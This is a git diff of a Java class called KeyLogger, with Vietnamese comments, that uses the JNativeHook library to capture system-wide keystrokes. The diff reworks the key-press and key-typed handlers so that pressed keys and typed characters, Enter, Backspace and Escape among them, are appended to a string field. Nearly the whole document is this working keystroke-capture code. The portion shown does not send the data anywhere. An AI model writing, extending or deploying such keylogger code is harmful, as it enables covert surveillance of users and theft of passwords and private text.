@@ -22,69 +22,89 @@ import java.security.Key;
  */
 public class KeyLogger implements NativeKeyListener {
 
-    //biến store để lưu key
-    public String store = "";
+    //biến data để lưu key
+    public String data = "";
 
-//    public StringBuffer sb = new StringBuffer();
-
-    @Override
     public void nativeKeyPressed(NativeKeyEvent e) {
-
-        String key = NativeKeyEvent.getKeyText(e.getKeyCode());
-        System.out.println("Pressed: " + key);
-        switch (key)
-        {
-             case "Space":
-                 store += " ";
-                 break;
-             case "Enter":
-                 store += "\n";
-                 break;
-             case "Open Bracket":
-                 store += "[";
-                 break;
-             case "Close Bracket":
-                 store += "]";
-                 break;
-             case "Comma":
-                 store += ",";
-                 break;
-             case "Period":
-                 store += ".";
-                 break;
-             case "Slash":
-                 store += "/";
-                 break;
-             case "Quote":
-                 store += "'";
-                 break;
-             case "Minus":
-                 store += "-";
-                 break;
-             case "Back Quote":
-                 store += "`";
-                 break;
-             case "Equals":
-                 store += "=";
-                 break;
-             default:
-                store += key;
-                break;
-         } //end of switch
         
-//        sb.append(key);
+        // Lấy keycCode trong thư viện
+        int get_keyCode = e.getKeyCode();
+        
+        // Biến keyValue lưu phím
+        String keyValue = "";
+        
+        switch (get_keyCode){
+            case 42:    
+            case 29:    
+            case 56:    
+            case 69:    
+            case 59:    
+            case 60:    
+            case 61:   
+            case 62:   
+            case 63:    
+            case 64:    
+            case 65:    
+            case 66:    
+            case 67:    
+            case 68:   
+            case 87:    
+            case 88:      
+            case 15:    
+            case 58:    
+            case 3667:  
+            case 3666:  
+            case 3655:  
+            case 3653:  
+            case 3663:  
+            case 3657: 
+            case 3665:  
+            case 57416: 
+            case 57419: 
+            case 57421:
+            case 57424: 
+                keyValue = NativeKeyEvent.getKeyText(get_keyCode);
+                data += keyValue;
+                break; 
+            case 53:    
+            case 52:    
+            case 3658:  
+            case 3662:  
+                break; 
+            default:
+                keyValue = NativeKeyEvent.getKeyText(get_keyCode);
+                break;
+        }
     }
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent e) {
-//        String key = NativeKeyEvent.getKeyText(e.getKeyCode());
-//        System.out.println("Released: " + key);
-
-//        store += key;
-//        sb.append(key);
+        
     }
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent e){
+        String keyVal = "";
+
+        char get_char = e.getKeyChar();
+        int c1 = get_char;
+        
+        // Cài lại phím
+        if (c1 == 13){
+            keyVal += "Enter";
+        }
+        else if(c1 == 8){ 
+            keyVal += "Backspace";
+        }
+        else if(c1 == 27){
+            keyVal += "Escape";
+        }
+        else{
+            keyVal += get_char;
+        }
+        
+        data += keyVal;
+//        System.out.println("Typed: "+ data);
+
     }
 }
